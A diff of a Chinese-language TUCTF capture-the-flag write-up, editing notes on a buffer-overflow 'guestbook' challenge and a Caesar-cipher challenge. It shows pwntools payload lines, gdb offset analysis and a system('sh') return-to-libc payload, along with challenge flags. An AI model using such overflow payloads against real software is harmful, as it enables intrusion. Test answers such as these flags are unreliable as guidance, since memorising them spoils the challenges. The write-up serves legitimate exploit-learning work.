@@ -36,6 +36,7 @@ r.send('a'*43 + "\x72\x86")
 r.interactive()
 ```
 
+這題比第一題還水...
 
 ## guestbook
 
@@ -45,7 +46,7 @@ r.interactive()
 
 所以理論上可以直接蓋到return address
 
-但要注意中間有東西會被蓋壞 (strcpy那邊)
+但要注意中間有東西會被蓋壞 (strcpy那附近)
 
 跟一下可以發現
 
@@ -64,8 +65,9 @@ r.interactive()
    0x56555994 <main+466>: call   0x56555570 <strcpy@plt>
 ```
 
-index的offset的話就是 0x98 - 0x34
+index的offset的話就是 0x98 - 0x34 = 100
 
+(P.S. 我是從dest[0]去change name)
 
 除了這邊，還有一個地方會爛：
 
@@ -81,7 +83,7 @@ index的offset的話就是 0x98 - 0x34
    0x5655599e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
    0x565559a2 <main+480>:       jmp    0x565559b3 <main+497>
 Guessed arguments:
-     arg[0]: 0x56558008 --> 0x61 ('a')      <===========  我一開輸入的第0個是a，現在要去change它
+     arg[0]: 0x56558008 --> 0x61 ('a')      <===========  我一開始輸入的第0個是a，現在要去change它
      arg[1]: 0xffffd540 --> 0xffff0078 --> 0x0
 ```
 
@@ -114,12 +116,13 @@ Guessed arguments:
 
 `r.sendline("\x00"*108 + p32(data1) * 1 + p32(0xdeadbeef) * 11 + p32(system_addr) + p32(sh) * 2)`
 
+`TUCTF{k33p_17_up_k1d}`
 
 ## The nerver ending crypto
 
-英文+特殊符號的凱薩加密
+大小寫英文+特殊符號的凱薩加密(要繞一圈)
 
-共50回合
+共做50回合
 
 
 `TUCTF{wh0_w@s_her3_la5t_ye@r?!?}`
